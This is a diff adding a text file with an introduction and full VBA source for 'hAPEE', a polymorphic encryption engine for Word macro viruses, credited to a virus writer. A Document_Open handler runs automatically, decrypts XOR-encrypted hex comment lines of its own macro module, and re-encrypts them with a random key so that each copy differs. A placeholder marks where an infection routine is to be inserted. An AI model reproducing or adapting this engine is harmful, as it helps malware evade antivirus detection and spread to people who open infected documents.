@@ -1,0 +1,55 @@
+hex AntiSocial Poly-Encryption Engine v1.0 (hAPEE)
+hex Antisocial Poly-Encryption Engine (hAPEE) is based off of the older APEE engine. The difference is that hAPEE encrypts each line of code with a random length key that can be up to 16 characters long. hAPEE also stores the encrypted line as a comment with each character represented as its hexedecimal value. This allows hAPEE to store nonprintable characters without screwing things up in the macro storage environment. 
+
+To all those who were waiting for an improvement to the older APEE engine, sorry it has taken this long (almost two years). Here it is, yet another toy by Lys KovicK. Enjoy... 
+
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+    hex AntiSocial Poly-Encryption Engine v1.0  (hAPEE)
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+
+Private Sub Document_Open()
+For A = 17 To 41 '// Adjust For Line Changes //
+B = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(A, 1)
+C = Asc(Chr("&H" & Mid(B, 2, 2)))
+E = 2
+For D = C + 2 To Len(B) Step 2
+E = E + 2
+F = F & Chr(Asc(Chr("&H" & Mid(B, D, 2))) Xor Asc(Chr("&H" & Mid(B, E, 2))))
+If E = C Then E = 2
+Next
+ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine A, F
+F = ""
+Next
+hAPEE
+End Sub
+Private Function hAPEE()
+On Error Resume Next
+For Lines2Encrypt = 17 To 41 '// Adjust For Line Changes //
+Key = ""
+For KeyLoop = 1 To Int(Rnd * 15) + 1
+Key = Key & Chr(Int(Rnd * 254) + 1)
+Next
+Code = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(Lines2Encrypt, 1)
+Temp = ""
+HexCode = ""
+lenKey = 0
+For EncryptLoop = 1 To Len(Code)
+lenKey = lenKey + 1
+Temp = Temp & Chr(Asc(Mid(Code, EncryptLoop, 1)) Xor Asc(Mid(Key, lenKey, 1)))
+If lenKey = Len(Key) Then lenKey = 0
+Next
+EncryptCode = Chr((Len(Key) * 2) + 2) & Key & Temp
+HexCode = ""
+For Code2Hex = 1 To Len(EncryptCode)
+TempHex = Hex(Asc(Mid(EncryptCode, Code2Hex, 1)))
+If Len(TempHex) = 1 Then TempHex = "0" & TempHex
+HexCode = HexCode & TempHex
+Next
+ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine Lines2Encrypt, "'" & HexCode
+Next
+'// Insert Infection Routine Here! //
+End Function
+
+
